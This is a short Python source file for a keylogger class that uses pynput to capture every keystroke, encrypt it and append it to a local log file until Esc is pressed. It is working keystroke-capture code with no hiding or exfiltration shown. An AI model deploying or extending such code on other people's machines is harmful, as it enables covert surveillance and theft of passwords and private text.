from pynput import keyboard
import os
from utils.crypto import load_key, encrypt_message

class KeyLogger:
    def __init__(self, log_file="logs/keystrokes.log"):
        self.log_file = log_file
        self.key = load_key()
        
        # Create logs directory if not exists
        log_dir = os.path.dirname(log_file)
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

    def on_press(self, key):
        # Stop listener if Esc is pressed
        if key == keyboard.Key.esc:
            print("Esc pressed. Stopping keylogger...")
            return False  # This stops the listener
        
        try:
            msg = f"Key: {key.char}"
        except AttributeError:
            msg = f"Special Key: {key}"

        encrypted = encrypt_message(msg, self.key)
        with open(self.log_file, "ab") as f:
            f.write(encrypted + b"\n")

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
